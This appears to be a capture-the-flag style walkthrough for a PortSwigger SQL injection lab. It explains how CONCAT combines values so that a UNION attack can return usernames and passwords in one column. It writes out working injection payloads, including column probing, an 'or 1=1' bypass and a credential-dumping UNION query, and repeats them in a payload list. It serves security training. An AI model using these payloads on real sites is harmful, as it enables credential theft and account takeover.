# SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

---

### **What is CONCAT and How is it Used in SQL Injection?**

**CONCAT** is a SQL function used to combine (concatenate) two or more values into a single string. It is particularly useful in SQL injection attacks for merging multiple pieces of data into a single result when the application only displays one column.

#### **Basic Usage of CONCAT**:
```sql
SELECT CONCAT('foo', 'bar'); 
-- Result: 'foobar'
```

#### **Why Use CONCAT in SQL Injection?**
In UNION attacks, when the application returns only one column, **CONCAT** can be used to combine multiple values (e.g., `username` and `password`) into a single string. This allows attackers to extract multiple pieces of information in one query.

---

### **Steps to Perform the Attack**

#### **Step 1: Analyze the Query Structure**
By injecting the following payload:
```
/filter?category=Gifts'--
```
The application likely executes a query like:
```sql
SELECT product_name, description 
FROM products 
WHERE category = 'Gifts';
```
This query:
- Returns two columns: `product_name` and `description`.

#### **Step 2: Determine the Number of Columns**
To find the number of columns in the original query, inject:
```
/filter?category=Gifts'+union+all+select+NULL,NULL--
```
If no errors occur, the query has two columns.

#### **Step 3: Use CONCAT to Retrieve Data**
After determining that the query returns two columns, use the second column to display concatenated strings. For example:
```
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
```

#### **Step 4: Retrieve User Data**
To extract usernames and passwords, use:
```
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```

#### **Explanation of the Query**:
1. The original query:
   ```sql
   SELECT product_name, description 
   FROM products 
   WHERE category = 'Gifts';
   ```
2. The injected query:
   ```sql
   SELECT product_name, description 
   FROM products 
   WHERE category = 'Gifts'
   UNION ALL
   SELECT NULL, CONCAT(username, ':', password) 
   FROM users;
   ```
3. Key details:
   - `NULL`: Placeholder for the first column, which isn’t relevant here.
   - `CONCAT(username, ':', password)`: Combines `username` and `password` with a colon (`:`) separator.

---

### **Valid Payloads**

#### **Initial Test Payloads**:
- Display 4 items in "Gifts" category:
  ```
  /filter?category=Gifts'--
  ```
- Display all items using a bypass:
  ```
  /filter?category=Gifts'+or+1=1--
  ```

#### **Determine Column Count**:
- Use:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL--
  ```

#### **Retrieve Concatenated Data**:
- Combine static strings:
  ```
  /filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
  ```
- Extract user credentials:
  ```
  /filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
  ```

---

### **References**

- [SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

--- 

### **Illustrations**

#### **Initial Display (Product Name)**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/1.png)

#### **Validating Column Count**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/2.png)

#### **Using CONCAT with Static Strings**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/3.png)

#### **Extracting User Data**:
![img](images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/4.png)

